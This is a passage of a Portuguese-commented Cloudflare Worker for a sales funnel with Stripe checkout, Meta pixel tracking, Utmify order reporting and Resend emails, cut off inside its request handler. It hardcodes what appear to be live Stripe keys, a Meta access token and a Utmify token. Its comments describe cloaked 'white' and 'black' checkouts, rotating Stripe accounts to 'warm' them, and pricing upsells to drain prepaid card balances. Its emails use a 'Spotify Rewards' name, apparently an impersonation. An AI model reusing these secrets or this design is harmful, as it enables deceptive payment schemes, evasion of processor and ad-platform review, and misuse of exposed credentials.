/**
 * =========================================================================================
 * 🚀 CLOUDFLARE WORKER: CHECKOUT SSR, MULTI-PIXEL CAPI, RESEND & ROTEADOR STRIPE
 * =========================================================================================
 *
 * 📖 GUIA RÁPIDO DE CONFIGURAÇÃO & USO (LEIA AQUI PARA NÃO SE PERDER):
 * -----------------------------------------------------------------------------------------
 * 1️⃣ COMO TROCAR OU CONFIGURAR AS CONTAS STRIPE:
 *    - CONTA A (Principal): Altere em STRIPE_ACCOUNT_A (publicKey e secretKey).
 *    - CONTA B (Secundária): Altere em STRIPE_ACCOUNT_B (publicKey e secretKey).
 *    - CHAVES DE TESTE: Configure em STRIPE_A_PUBLIC_KEY_TEST / STRIPE_B_PUBLIC_KEY_TEST.
 *
 * 2️⃣ COMO DIVIDIR O TRÁFEGO ENTRE AS STRIPES (ROTEADOR / AQUECIMENTO SEGURO):
 *    - Altere a constante: const STRIPE_B_TRAFFIC_PERCENT = 0;
 *      • 0   = 100% do tráfego na Stripe A (Conta 1) [PADRÃO ATUAL SEGURO].
 *      • 5   = 95% na Stripe A e 5% na Stripe B (Modo Blindado para aquecer nova conta).
 *      • 20  = 80% na Stripe A e 20% na Stripe B.
 *      • 50  = Divisão igualitária 50/50.
 *
 * 3️⃣ COMO TESTAR O CHECKOUT ANTES DE MANDAR ANÚNCIOS (MODOS DE TESTE NA URL):
 *    - Para testar na Stripe 1: Abra seu checkout com ?modo_teste=1
 *      Exemplo: https://seusite.com/?modo_teste=1
 *    - Para testar na Stripe 2: Abra seu checkout com ?modo_teste=2
 *      Exemplo: https://seusite.com/?modo_teste=2
 *    - Para forçar uma compra real em Live na Stripe B: Use ?force_acc=b
 *    *(OBS: Quando ?modo_teste está na URL, o Pixel do Facebook é silenciado automaticamente!)*
 *
 * 4️⃣ COMO CONFIGURAR OS PIXELS DO FACEBOOK (META CAPI):
 *    - Procure por META_CONFIGS (logo abaixo):
 *      Insira o 'pixelId' e o 'token' da API de Conversões gerado no Gerenciador de Eventos.
 *      Você pode adicionar quantos pixels quiser no array [{ pixelId, token }].
 *
 * 5️⃣ COMO CONFIGURAR O TOKEN DA UTMIFY:
 *    - Procure por HARDCODED_UTMIFY_TOKEN: Cole o token de API da sua Utmify.
 *
 * 6️⃣ ONDE MUDAR AS URLs DO FUNIL / UPSELLS / OBRIGADO (Linhas ~690):
 *    - UP1_URL: Link da página do Upsell 1.
 *    - UP2_URL: Link da página do Upsell 2.
 *    - FINAL_THANKS_URL: Página de Obrigado final com acesso liberado.
 *    - SAFE_THANKS_URL: Página de Obrigado Safe (para tráfego white/cloaker).
 *
 * 7️⃣ PREÇOS PADRÃO (Linhas ~685):
 *    - FALLBACK_FRONT_PRICE_CENTS = 990; (Front: $9.90 USD/EUR)
 *    - FALLBACK_UP2_PRICE_CENTS   = 1790; (Upsell 2: $17.90 USD/EUR)
 *    - O Upsell 1 calcula o preço de forma inteligente ($27.90 / $15.00 / $5.90)
 *      de acordo com o saldo previsto e o tipo de cartão do cliente!
 *
 * =========================================================================================
 * 🗺️ MAPA DE SEÇÕES DO ARQUIVO:
 * -----------------------------------------------------------------------------------------
 *  [SEÇÃO 1] - Credenciais das Contas Stripe & Divisão de Tráfego (Linhas ~75 - ~150)
 *  [SEÇÃO 2] - Tokens de Rastreamento: Utmify & Meta Pixel / CAPI (Linhas ~155 - ~180)
 *  [SEÇÃO 3] - Inteligência de Moedas & Precificação Dinâmica (Linhas ~185 - ~245)
 *  [SEÇÃO 4] - Proteção Antifraude & Cache de Recusas (Linhas ~250 - ~280)
 *  [SEÇÃO 5] - Envio de Eventos CAPI & Pedidos Utmify (Linhas ~285 - ~450)
 *  [SEÇÃO 6] - Templates de E-mail Automático (Resend API) (Linhas ~455 - ~600)
 *  [SEÇÃO 7] - Roteador Central (fetch handler) & Endpoints (Linhas ~605 - ~2300)
 *  [SEÇÃO 8] - Renderizadores de Checkout: Safe White & Principal Black (Linhas ~2400+)
 * =========================================================================================
 */

// =========================================================================================
// [SEÇÃO 1] CONFIGURAÇÃO MULTI-CONTA STRIPE (ROTEADOR DE TRÁFEGO & CREDENCIAIS)
// =========================================================================================

// CONTA A: Principal / Já aquecida
// CONTA A: Principal / Já aquecida
const STRIPE_ACCOUNT_A = {
  account: 'a',
  publicKey: 'pk_live_51ThhrN7GwAZdXyePzfB1w6HjIdMGOVkKodDrxfXHEA3YGhKZoFYd6fbOBxsTrjKXdiS9c6WXRtZBtPT58olQLII400BlJXBQIG',
  secretKey: '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'
};

// CONTA B: Segunda conta (Configure aqui quando tiver uma nova conta Stripe)
// CONTA B: Segunda conta (Configure aqui quando tiver uma nova conta Stripe)
const STRIPE_ACCOUNT_B = {
  account: 'b',
  publicKey: 'pk_live_51UJK1XI0sCtx1PWKiNcQHyjn6mqAznQcTWbH2tajCQdKMDTD5TzPWqHa1ixzIXfYJ4lUxeeLyGFusTjQAVt0QXcV00NgplenUz',
  secretKey: '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'
};

// 🔴 PORCENTAGEM DE TRÁFEGO PARA A STRIPE B (0 a 100):
// 0 = 100% das vendas vão para a Stripe A (recomendado quando a Stripe B estiver pausada).
// 5 = Modo Blindado (começa mandando apenas 5% das vendas para a Stripe B aquecer).
const STRIPE_B_TRAFFIC_PERCENT = 0;

// Compatibilidade e Fallbacks globais
const DEFAULT_STRIPE_PUBLIC_KEY = STRIPE_ACCOUNT_A.publicKey;
const HARDCODED_STRIPE_SECRET_KEY = STRIPE_ACCOUNT_A.secretKey;

// Chaves de Teste para Conta A (?modo_teste=1 na URL)
// Chaves de Teste para Conta A (?modo_teste=1 na URL)
const STRIPE_A_PUBLIC_KEY_TEST = 'pk_test_SUA_CHAVE_PUBLICA_TESTE_A_AQUI';
const STRIPE_A_SECRET_KEY_TEST = 'sk_test_SUA_CHAVE_SECRETA_TESTE_A_AQUI';

// Chaves de Teste para Conta B (?modo_teste=2 na URL)
// Chaves de Teste para Conta B (?modo_teste=2 na URL)
const STRIPE_B_PUBLIC_KEY_TEST = 'pk_test_SUA_CHAVE_PUBLICA_TESTE_B_AQUI';
const STRIPE_B_SECRET_KEY_TEST = 'sk_test_SUA_CHAVE_SECRETA_TESTE_B_AQUI';

// Fallbacks de teste
const STRIPE_PUBLIC_KEY_TEST = STRIPE_A_PUBLIC_KEY_TEST;
const STRIPE_SECRET_KEY_TEST = STRIPE_A_SECRET_KEY_TEST;

const HARDCODED_RESEND_API_KEY = 're_SUA_CHAVE_API_RESEND_AQUI';

// 🔴 WORKER MODULAR DE SUPORTE, FUNIL E PROTOCOLO DE REEMBOLSO
const FUNNEL_SUPPORT_WORKER_URL = 'https://SEU_WORKER_SUPORTE.workers.dev';
const FUNNEL_SERVICE_SECRET = 'sec_SEU_SECRET_DO_WORKER_SUPORTE_AQUI';

// Helper de seleção inteligente de conta Stripe
function selectStripeAccount(reqUrl) {
  const force = reqUrl && reqUrl.searchParams && reqUrl.searchParams.get('force_acc');
  if (force === 'b') return 'b';
  if (force === 'a') return 'a';
  const modoTeste = reqUrl && reqUrl.searchParams && reqUrl.searchParams.get('modo_teste');
  if (modoTeste === '2') return 'b';
  if (modoTeste === '1') return 'a';
  if (STRIPE_B_TRAFFIC_PERCENT <= 0) return 'a';
  const rand = Math.floor(Math.random() * 100);
  return (rand < STRIPE_B_TRAFFIC_PERCENT) ? 'b' : 'a';
}

// Helper para obter credenciais da conta Stripe (Live e Teste isolados por conta)
function getStripeCredentials(accountCode, isTest = false) {
  if (isTest) {
    if (accountCode === 'b') {
      return {
        account: 'test_b',
        publicKey: STRIPE_B_PUBLIC_KEY_TEST,
        secretKey: STRIPE_B_SECRET_KEY_TEST
      };
    }
    return {
      account: 'test_a',
      publicKey: STRIPE_A_PUBLIC_KEY_TEST,
      secretKey: STRIPE_A_SECRET_KEY_TEST
    };
  }
  if (accountCode === 'b') {
    return STRIPE_ACCOUNT_B;
  }
  return STRIPE_ACCOUNT_A;
}

// =========================================================================================
// [SEÇÃO 2] TOKENS DE RASTREAMENTO: UTMIFY & META PIXEL / CONVERSIONS API (CAPI)
// =========================================================================================

// 🔴 TOKEN DA API UTMIFY (Integrações -> Webhooks -> Credenciais de API)
const HARDCODED_UTMIFY_TOKEN = 'TeZQ4GcZS3EfyJLmt5OYDhhOUFtzBJJHpUno';

// 🔴 CONFIGURAÇÃO MULTI-PIXEL E CAPI (Meta / Facebook)
const META_CONFIGS = [
  {
    pixelId: '919975694160799',
    token: 'EAASKGfLoQUIBSq4GLaQG3AzqBjJAZAsc9xZBmfTZARtLOnfZCiMHMfUZAC6mSE7xALPGrW4HL3IogcqroJIqrOpj4jvZAdzVUtNyr3SPv4WPDBc2vDRPlS3kRa68JC01BeaT62J4BaT34jjHO2KZAawz6EZBkmZBcqt2yQ1zZCYyqG1Aq7IZCE8ZC0VzPwTAp5IZA2gZDZD'
  },
  {
    pixelId: '4472134583045790',
    token: 'EAASKGfLoQUIBSq4GLaQG3AzqBjJAZAsc9xZBmfTZARtLOnfZCiMHMfUZAC6mSE7xALPGrW4HL3IogcqroJIqrOpj4jvZAdzVUtNyr3SPv4WPDBc2vDRPlS3kRa68JC01BeaT62J4BaT34jjHO2KZAawz6EZBkmZBcqt2yQ1zZCYyqG1Aq7IZCE8ZC0VzPwTAp5IZA2gZDZD'
  }
];

// Fallbacks para compatibilidade
const META_PIXEL_ID = META_CONFIGS[0].pixelId;
const META_ACCESS_TOKEN = META_CONFIGS[0].token;

// =========================================================================================
// [SEÇÃO 3] INTELIGÊNCIA DE MOEDAS & PRECIFICAÇÃO DINÂMICA DE UPSELLS
// =========================================================================================

// 🔴 LISTA DE PAÍSES TIER 1 (Alto poder aquisitivo para Upsell $27.90)
const TIER_1_COUNTRIES = new Set(['US', 'CA', 'GB', 'AU', 'NZ', 'IE', 'DE', 'FR', 'NL', 'CH', 'NO', 'SE', 'DK']);
function isTier1Country(cc) {
  if (!cc || typeof cc !== 'string') return false;
  return TIER_1_COUNTRIES.has(cc.trim().toUpperCase());
}

// 🔴 SMART MULTI-CURRENCY (Aprovação Máxima em Moeda Local sem Alteração Visual)
const EUROZONE_COUNTRIES = new Set([
  'PT', 'ES', 'FR', 'DE', 'IT', 'NL', 'BE', 'IE', 'AT', 'GR', 
  'FI', 'SK', 'EE', 'LV', 'LT', 'SI', 'CY', 'MT', 'LU'
]);

function resolveSmartCurrency(countryCode) {
  if (!countryCode || typeof countryCode !== 'string') return 'usd';
  const cc = countryCode.trim().toUpperCase();
  if (cc === 'CA') return 'cad';
  if (EUROZONE_COUNTRIES.has(cc)) return 'eur';
  if (cc === 'GB') return 'gbp';
  if (cc === 'AU') return 'aud';
  if (cc === 'NZ') return 'nzd';
  return 'usd';
}

// 🔴 INTELIGÊNCIA DINÂMICA DE CARTÃO (Previsão de Saldo / Limite)
function resolveDynamicUp1Price(pmCard, userCountry) {
  const isTier1 = isTier1Country(userCountry);
  const funding = (pmCard && pmCard.funding) ? String(pmCard.funding).toLowerCase() : 'credit';
  const hasWallet = !!(pmCard && pmCard.wallet);

  // 1. Cartão Pré-pago (Gift card, Chime, Cash App, Green Dot, cartões virtuais recarregáveis)
  // Praticamente NUNCA passa $27.90 ou $15.00 porque o lead só recarregou a quantia do front.
  // Oferece direto $5.90 para capturar o saldo residual e garantir conversão sem recusa!
  if (funding === 'prepaid') {
    return {
      price: '5.90',
      price_cents: '590',
      tier: '3',
      profile: 'prepaid_budget'
    };
  }

  // 2. Cartão de Crédito puro em Tier 1 OU Usuário de Apple Pay / Google Pay
  // Alto poder aquisitivo, limite rotativo folgado.
  if ((isTier1 && funding === 'credit') || hasWallet) {
    return {
      price: '27.90',
      price_cents: '2790',
      tier: '1',
      profile: 'high_limit'
    };
  }

  // 3. Débito em Tier 1 OU Cartão padrão nos demais países
  // Saldo moderado em conta corrente.
  return {
    price: '15.00',
    price_cents: '1500',
    tier: '2',
    profile: 'standard'
  };
}

// =========================================================================================
// [SEÇÃO 4] PROTEÇÃO ANTIFRAUDE, BLOQUEIO DE CARTÕES RECUSADOS & CACHE DE COMPRADORES
// =========================================================================================

// 🔴 CACHE GLOBAL DE RECUSAS E CONTROLE DE TENTATIVAS (MÁX 2 NO MESMO CARTÃO / 3 NO TOTAL)
const GLOBAL_BLOCKED_CARDS = new Map();
const GLOBAL_CARD_FAILS    = new Map();
const GLOBAL_EMAIL_FAILS   = new Map();

// 🔴 CACHE GLOBAL DE CLIENTES E CARTÕES QUE JÁ COMPRARAM O FRONT (ZERO REPETIÇÃO)
const GLOBAL_PURCHASED_EMAILS = new Map();
const GLOBAL_PURCHASED_CARDS  = new Map();

// ─── HELPERS: SANITIZAÇÃO E RESEND ───
function sanitizeEmail(email) {
  let e = (email || "").trim().toLowerCase();
  if (/@gmail\.c(o)?$/i.test(e)) e = e.replace(/@gmail\.c(o)?$/i, "@gmail.com");
  if (/@hotmail\.c(o)?$/i.test(e)) e = e.replace(/@hotmail\.c(o)?$/i, "@hotmail.com");
  if (/@yahoo\.c(o)?$/i.test(e)) e = e.replace(/@yahoo\.c(o)?$/i, "@yahoo.com");
  if (/@outlook\.c(o)?$/i.test(e)) e = e.replace(/@outlook\.c(o)?$/i, "@outlook.com");
  return e;
}

// 🔴 HELPER: VERIFICAÇÃO CRIPTOGRÁFICA DE ASSINATURA STRIPE (HMAC-SHA256)
async function verifyStripeWebhookSignature(rawBody, signatureHeader, secret) {
  if (!signatureHeader || !secret) return false;
  try {
    const parts = signatureHeader.split(',');
    let timestamp = null;
    let signatures = [];
    
    for (const part of parts) {
      const [k, v] = part.trim().split('=');
      if (k === 't') timestamp = v;
      if (k === 'v1') signatures.push(v);
    }
    
    if (!timestamp || signatures.length === 0) return false;
    
    // Tolerância de 5 minutos (300 segundos) para evitar replay attack
    const nowSecs = Math.floor(Date.now() / 1000);
    if (Math.abs(nowSecs - Number(timestamp)) > 300) {
      return false;
    }
    
    const encoder = new TextEncoder();
    const payloadToSign = `${timestamp}.${rawBody}`;
    
    const key = await crypto.subtle.importKey(
      'raw',
      encoder.encode(secret.trim()),
      { name: 'HMAC', hash: 'SHA-256' },
      false,
      ['sign']
    );
    
    const signatureBuffer = await crypto.subtle.sign(
      'HMAC',
      key,
      encoder.encode(payloadToSign)
    );
    
    const expectedSig = Array.from(new Uint8Array(signatureBuffer))
      .map(b => b.toString(16).padStart(2, '0'))
      .join('');
      
    return signatures.includes(expectedSig);
  } catch (e) {
    return false;
  }
}

// =========================================================================================
// [SEÇÃO 5] ENVIO DE EVENTOS PARA META CONVERSIONS API (CAPI) & API DE PEDIDOS DA UTMIFY
// =========================================================================================

// ─── HELPER: FACEBOOK CONVERSIONS API (CAPI) MULTI-PIXEL COM ADVANCED MATCHING MÁXIMO ───
async function sendCAPIEvent(eventName, eventData, request, pixelTargets, tokenFallback) {
  if (pixelTargets === null) {
    return; // Modo teste silenciado
  }

  let targets = META_CONFIGS;
  if (Array.isArray(pixelTargets) && pixelTargets.length > 0) {
    targets = pixelTargets;
  } else if (typeof pixelTargets === 'string' && pixelTargets.trim() !== '') {
    targets = [{ pixelId: pixelTargets, token: tokenFallback || (META_CONFIGS[0] && META_CONFIGS[0].token) }];
  }

  if (!targets || targets.length === 0) return;

  try {
    const hashData = async (data) => {
      if (!data || typeof data !== 'string') return undefined;
      const clean = data.trim().toLowerCase();
      if (!clean) return undefined;
      const buffer = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(clean));
      return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, '0')).join('');
    };

    const normalizePhone = (rawPhone, countryCode) => {
      if (!rawPhone || typeof rawPhone !== 'string') return '';
      let digits = rawPhone.replace(/\D/g, '');
      if (!digits || digits.length < 7) return '';
      const c = (countryCode || '').toUpperCase();

      // Remove prefixo acidental "1" se o país for outro e o número já tiver o código do país
      const ddiMap = { 'TH': '66', 'GB': '44', 'AU': '61', 'NZ': '64', 'IE': '353', 'BR': '55', 'SG': '65', 'MY': '60', 'PH': '63' };
      if (c !== 'US' && c !== 'CA' && ddiMap[c] && digits.startsWith('1' + ddiMap[c])) {
        digits = digits.slice(1);
      }

      if (c === 'US' || c === 'CA') {
        let clean = digits.replace(/^1+/, '');
        if (clean.length === 10) return '1' + clean;
        if (digits.length === 10) return '1' + digits;
        return digits;
      }
      if (c === 'IE') {
        let clean = digits.replace(/^1?0+/, '');
        if (!clean.startsWith('353')) clean = '353' + clean;
        return clean;
      }
      if (c === 'NZ') {
        let clean = digits.replace(/^1?0+/, '');
        if (!clean.startsWith('64')) clean = '64' + clean;
        return clean;
      }
      if (c === 'GB') {
        let clean = digits.replace(/^1?0+/, '');
        if (!clean.startsWith('44')) clean = '44' + clean;
        return clean;
      }
      if (c === 'AU') {
        let clean = digits.replace(/^1?0+/, '');
        if (!clean.startsWith('61')) clean = '61' + clean;
        return clean;
      }
      if (c === 'TH') {
        let clean = digits.replace(/^1?0+/, '');
        if (!clean.startsWith('66')) clean = '66' + clean;
        return clean;
      }
      if (c === 'BR') {
        let clean = digits.replace(/^55/, '');
        return '55' + clean;
      }
      return digits;
    };

    const clientCountry = eventData.country || (request ? request.headers.get('cf-ipcountry') : 'US') || 'US';
    const cleanCountry = clientCountry.toLowerCase().trim();

    // Hashing dos identificadores avançados
    const em = await hashData(eventData.email);
    const cleanedPhone = normalizePhone(eventData.phone, clientCountry);
    const ph = await hashData(cleanedPhone);

    const rawName = (eventData.name || '').trim();
    const nameParts = rawName.split(/\s+/).filter(Boolean);
    const firstName = eventData.firstName || (nameParts.length > 0 ? nameParts[0] : '');
    const lastName = eventData.lastName || (nameParts.length > 1 ? nameParts.slice(1).join(' ') : '');
    const fn = await hashData(firstName);
    const ln = await hashData(lastName);

    const countryHash = await hashData(cleanCountry.length === 2 ? cleanCountry : 'us');
    const ct = await hashData(eventData.city ? eventData.city.replace(/[\s\-_]/g, '') : undefined);
    const zp = await hashData(eventData.postalCode || eventData.zip ? (eventData.postalCode || eventData.zip).replace(/[\s\-_]/g, '') : undefined);
    const externalId = await hashData(eventData.externalId || eventData.customerId || eventData.email);

    const nowSecs = Math.floor(Date.now() / 1000);

    const payload = {
      data: [{
        event_name: eventName,
        event_time: nowSecs,
        action_source: "website",
        event_source_url: request ? request.url : '',
        user_data: {
          client_ip_address: request ? (request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || '') : '',
          client_user_agent: request ? (request.headers.get('user-agent') || '') : ''
        },
        custom_data: {
          value: eventData.value,
          currency: eventData.currency || 'USD'
        }
      }]
    };

    if (eventData.eventId) {
      payload.data[0].event_id = String(eventData.eventId);
    }

    // Cookie Parsing para FBP e FBC (Aumenta o Match Quality)
    const cookieHeader = request ? (request.headers.get('cookie') || '') : '';
    const getCookie = (name) => {
      const match = cookieHeader.match(new RegExp('(^| )' + name + '=([^;]+)'));
      return match ? match[2] : null;
    };

    let fbp = getCookie('_fbp') || eventData.fbp;
    let fbc = getCookie('_fbc') || eventData.fbc;

    // Se o cookie _fbc não veio do navegador (ex: Safari/iOS ITP), resgata do fbclid
    if (!fbc) {
      let fbclid = eventData.fbclid;
      if (!fbclid && request) {
        try {
          const u = new URL(request.url);
          fbclid = u.searchParams.get('fbclid');
        } catch(e) {}
      }
      if (fbclid) {
        fbc = `fb.1.${nowSecs}.${fbclid}`;
      }
    }

    if (fbp) payload.data[0].user_data.fbp = fbp;
    if (fbc) payload.data[0].user_data.fbc = fbc;

    if (em) payload.data[0].user_data.em = [em];
    if (ph) payload.data[0].user_data.ph = [ph];
    if (fn) payload.data[0].user_data.fn = [fn];
    if (ln) payload.data[0].user_data.ln = [ln];
    if (countryHash) payload.data[0].user_data.country = [countryHash];
    if (ct) payload.data[0].user_data.ct = [ct];
    if (zp) payload.data[0].user_data.zp = [zp];
    if (externalId) payload.data[0].user_data.external_id = [externalId];

    await Promise.allSettled(targets.map(cfg => {
      if (!cfg.pixelId || !cfg.token) return Promise.resolve();
      return fetch(`https://graph.facebook.com/v20.0/${cfg.pixelId}/events?access_token=${cfg.token}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    }));
  } catch (e) {
    // Falha silenciosa
  }
}

// ─── HELPER: ENVIO DE VENDAS PARA UTMIFY ───
async function sendUtmifyOrder(orderData, request, token, isTest = false) {
  if (!token) return;
  try {
    const nowUtc = new Date().toISOString().replace('T', ' ').substring(0, 19);
    const clientIp = request ? (request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || '') : '';
    let clientCountry = orderData.country || (request ? (request.headers.get('cf-ipcountry') || 'US') : 'US');
    if (!clientCountry || clientCountry.length !== 2 || clientCountry === 'XX' || clientCountry === 'T1') {
      clientCountry = 'US';
    }
    clientCountry = clientCountry.toUpperCase();

    const rawPriceInCents = Number(orderData.priceInCents) || 0;
    const orderCurr = (orderData.currency || 'USD').toUpperCase();
    let fxRate = 5.1818; // Taxa USD -> BRL
    if (orderCurr === 'EUR') fxRate = 6.10;
    else if (orderCurr === 'GBP') fxRate = 7.10;
    else if (orderCurr === 'CAD') fxRate = 4.00;
    else if (orderCurr === 'AUD') fxRate = 3.60;
    else if (orderCurr === 'NZD') fxRate = 3.30;
    else if (orderCurr === 'BRL') fxRate = 1.0;
    const totalPriceInCents = Math.round(rawPriceInCents * fxRate);
    // Faturamento Líquido na Utmify exibe a comissão: configurado para 100% do valor bruto em BRL
    const gatewayFeeInCents = 0;
    const userCommissionInCents = totalPriceInCents;

    const tracking = orderData.trackingParameters || {};
    const cleanParam = (val) => (val && typeof val === 'string' && val.trim() !== '') ? val.trim() : null;

    const payload = {
      orderId: String(orderData.orderId || ('ord_' + Date.now())),
      platform: orderData.platform || 'wellness-protocol',
      paymentMethod: 'credit_card',
      status: 'paid',
      createdAt: nowUtc,
      approvedDate: nowUtc,
      refundedAt: null,
      customer: {
        name: orderData.name || 'Customer',
        email: orderData.email || '',
        phone: orderData.phone ? String(orderData.phone).replace(/[^\d+]/g, '') : null,
        document: null,
        country: clientCountry
      },
      products: [
        {
          id: String(orderData.productId || 'prod_front'),
          name: String(orderData.productName || 'Access Pass'),
          planId: null,
          planName: null,
          quantity: 1,
          priceInCents: totalPriceInCents
        }
      ],
      trackingParameters: {
        src: cleanParam(tracking.src),
        sck: cleanParam(tracking.sck),
        utm_source: cleanParam(tracking.utm_source),
        utm_campaign: cleanParam(tracking.utm_campaign),
        utm_medium: cleanParam(tracking.utm_medium),
        utm_content: cleanParam(tracking.utm_content),
        utm_term: cleanParam(tracking.utm_term)
      },
      commission: {
        totalPriceInCents: totalPriceInCents,
        gatewayFeeInCents: gatewayFeeInCents,
        userCommissionInCents: userCommissionInCents,
        currency: 'BRL'
      },
      isTest: Boolean(isTest)
    };

    if (clientIp) {
      payload.customer.ip = clientIp;
    }

    await fetch('https://api.utmify.com.br/api-credentials/orders', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-api-token': token
      },
      body: JSON.stringify(payload)
    });
  } catch (e) {
    // Falha silenciosa para não travar o fluxo do comprador
  }
}

// =========================================================================================
// [SEÇÃO 6] DISPARO DE E-MAILS TRANSACIONAIS & RECUPERAÇÃO (RESEND API)
// =========================================================================================

async function cancelPendingRecoveryEmails(targetEmail, resendApiKey) {
  if (!targetEmail) return;
  try {
    const res = await fetch("https://api.resend.com/emails?limit=30", { headers: { "Authorization": "Bearer " + resendApiKey }});
    const data = await res.json();
    if (data && Array.isArray(data.data)) {
      for (const item of data.data) {
        if (item.last_event === "scheduled" && item.to && item.to.some(t => t.toLowerCase() === targetEmail)) {
          if (!item.subject.includes("Ready!")) {
            await fetch(`https://api.resend.com/emails/${item.id}/cancel`, { method: "POST", headers: { "Authorization": "Bearer " + resendApiKey }});
          }
        }
      }
    }
  } catch (e) {}
}

async function hasRecentAccessEmail(targetEmail, resendApiKey) {
  try {
    const res = await fetch("https://api.resend.com/emails?limit=30", { headers: { "Authorization": "Bearer " + resendApiKey }});
    const data = await res.json();
    if (data && Array.isArray(data.data)) {
      for (const item of data.data) {
        if (item.to && item.to.some(t => t.toLowerCase() === targetEmail)) {
          if (item.subject.includes("Ready!") && item.last_event !== "canceled") return true;
        }
      }
    }
  } catch (e) {}
  return false;
}

// ─── LÓGICA DE AGENDAMENTO DE EMAILS ───
async function scheduleAccessEmail(env, email, name, resendApiKey, fallbackUrl) {
  env = env || {};
  const cleanEmail = sanitizeEmail(email);
  await cancelPendingRecoveryEmails(cleanEmail, resendApiKey); 
  const alreadySent = await hasRecentAccessEmail(cleanEmail, resendApiKey);
 
  // Disparo centralizado no Worker de Suporte e Funil (Welcome + Agendamento D+2)
  try {
    const funnelRes = await fetch(`${FUNNEL_SUPPORT_WORKER_URL}/api/order-created`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-service-token': FUNNEL_SERVICE_SECRET
      },
      body: JSON.stringify({
        name: name,
        email: cleanEmail,
        orderId: 'access_grant',
        appName: 'Spotify Rewards'
      })
    });
    if (funnelRes.ok) {
      console.log('[Funnel Support] Pedido registrado e funil disparado para:', cleanEmail);
      return funnelRes;
    }
  } catch (e) {
    console.error('Erro ao acionar Funnel Worker, usando fallback direto:', e);
  }

  // Fallback caso o Worker de Suporte esteja inacessível
  const refundLink = `${FUNNEL_SUPPORT_WORKER_URL}/refund?email=${encodeURIComponent(cleanEmail)}&name=${encodeURIComponent(name || '')}`;

  const payload = {
    from: env.RESEND_FROM || 'Sua Marca <suporte@seudominio.com>',
    to: [cleanEmail],
    subject: 'Welcome! Your access is ready.',
    html: getWelcomeHtml(name, env.APP_ACCESS_URL || fallbackUrl, refundLink)
  };

  return fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: { 'Authorization': 'Bearer ' + resendApiKey, 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
}


async function scheduleRefundEmail(env, email, name, amountFormatted, cardLast4, refundDate, refundId, arn, resendApiKey) {
  env = env || {};
  const cleanEmail = sanitizeEmail(email);
  if (!cleanEmail || !resendApiKey || !resendApiKey.includes('re_')) return;

  const payload = {
    from: env.RESEND_FROM_BILLING || 'Suporte Financeiro <financeiro@seudominio.com>',
    to: [cleanEmail],
    subject: `Refund Notice: Your refund of ${amountFormatted} has been processed`,
    html: getRefundConfirmationHtml(name, amountFormatted, cardLast4, refundDate, refundId, arn)
  };

  return fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: { 'Authorization': 'Bearer ' + resendApiKey, 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
}

async function scheduleFailureEmail(env, email, name, resendApiKey, checkoutUrl) {
  env = env || {};
  const cleanEmail = sanitizeEmail(email);
  await cancelPendingRecoveryEmails(cleanEmail, resendApiKey);
  
  const payload = {
    from: env.RESEND_FROM || 'Sua Marca <suporte@seudominio.com>',
    to: [cleanEmail],
    subject: '⚠️ Action Required: Payment Unsuccessful',
    html: getCardFailureHtml(name, checkoutUrl)
  };

  return fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: { 'Authorization': 'Bearer ' + resendApiKey, 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  });
}


async function scheduleRefundAnalysisEmail(env, email, name, protocol, resendApiKey) {
  env = env || {};
  const cleanEmail = sanitizeEmail(email);
  if (!cleanEmail || !resendApiKey || !resendApiKey.startsWith('re_') || resendApiKey === 're_SUA_CHAVE_API_RESEND_AQUI') return false;

  const senderFrom = (env && env.RESEND_FROM_REFUND) || (env && env.RESEND_FROM) || 'Spotify Rewards <suporte@spoflow.shop>';
  const requestDate = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });

  const payload = {
    from: senderFrom,
    to: [cleanEmail],
    subject: `[Protocolo #${protocol}] Confirmação de Solicitação de Reembolso em Análise`,
    html: getRefundAnalysisEmailHtml(name, cleanEmail, protocol, requestDate)
  };

  try {
    const res = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: { 'Authorization': 'Bearer ' + resendApiKey, 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    return res.ok;
  } catch (e) {
    return false;
  }
}

// =========================================================================================
// [SEÇÃO 7] ROTEADOR PRINCIPAL (FETCH HANDLER), URLs DO FUNIL & ENDPOINTS DE API
// =========================================================================================

export default {
  async fetch(request, env = {}, ctx = {}) {
    env = env || {};
    ctx = ctx || { waitUntil: () => {} };
    try {
      const url = new URL(request.url);
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    };

    if (request.method === 'OPTIONS') return new Response(null, { status: 204, headers: corsHeaders });

    // ROTEADOR INTELIGENTE DE DOMÍNIO:
    const host = url.hostname.toLowerCase();
    const isCheckoutHost = host.startsWith('pay.') || host.includes('checkout');
    if (!isCheckoutHost && !url.pathname.startsWith('/api/')) {
      if (env && env.ASSETS) {
        if (url.pathname === '/' || url.pathname === '/sp/type' || url.pathname === '/sp/type/') {
          return env.ASSETS.fetch(new Request(new URL('/sp/type/index.html', request.url), request));
        }
        return env.ASSETS.fetch(request);
      }
    }

    // CAPTURA O PAÍS PELO IP DO CLOUDFLARE
    const clientCountry = (request.headers.get("CF-IPCountry") || request.headers.get("cf-ipcountry") || "US").toUpperCase();

    // 🔴 MODO DE TESTE ISOLADO POR CONTA:
    // ?modo_teste=1 -> Ativa modo teste na Stripe A (Conta Principal)
    // ?modo_teste=2 -> Ativa modo teste na Stripe B (Segunda Conta)
    const modoTesteParam = url.searchParams.get('modo_teste');
    const isTestMode = modoTesteParam === '1' || modoTesteParam === '2';
    
    // 🔴 SILENCIA O PIXEL EM TESTES: Se estiver em modo teste, repassa NULL / vazio
    const activePixelConfigs = isTestMode ? null : META_CONFIGS;
